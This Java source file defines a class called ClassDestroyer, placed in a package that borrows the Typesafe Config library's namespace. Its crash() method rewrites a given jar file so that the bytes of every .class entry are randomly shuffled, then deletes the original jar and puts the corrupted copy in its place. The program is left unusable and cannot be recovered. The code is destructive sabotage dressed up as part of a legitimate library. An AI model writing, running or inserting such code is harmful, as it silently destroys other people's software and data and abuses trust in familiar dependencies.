package com.typesafe.config.modded;

import org.apache.commons.io.IOUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Path;
import java.util.*;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;

public class ClassDestroyer {

    private File file;
    private File tempJar;
    private JarFile jar;

    public ClassDestroyer(Path jarFile) throws IOException {
        this.file = jarFile.toFile();
        this.tempJar = new File(jarFile + ".tmp.jar");
        this.jar = new JarFile(jarFile.toFile());
    }

    public void crash() throws IOException {
        Enumeration<JarEntry> entries = jar.entries();
        JarOutputStream out = new JarOutputStream(new FileOutputStream(tempJar));

        while (entries.hasMoreElements()){
            JarEntry entry = entries.nextElement();
            byte[] bytes = IOUtils.toByteArray(jar.getInputStream(entry));
            JarEntry newEntry = new JarEntry(entry.getName());

            out.putNextEntry(newEntry);

            if(getType(entry.getName()).equalsIgnoreCase("class")){
                shuffleByteArray(bytes);
            }

            out.write(bytes);
            out.closeEntry();
        }

        jar.close();
        out.close();
        file.delete();
        tempJar.renameTo(file);
    }

    private void shuffleByteArray(byte[] array){
        Random rand = new Random();

        for (int i = 0; i < array.length; i++) {
            int randomIndexToSwap = rand.nextInt(array.length);
            byte temp = array[randomIndexToSwap];
            array[randomIndexToSwap] = array[i];
            array[i] = temp;
        }
    }

    private String getName(String name){
        String[] arr = name.split("/");
        return arr[arr.length-1];
    }

    private String getType(String name){
        String[] arr = getName(name).split("\\.");
        return arr[arr.length-1];
    }

}
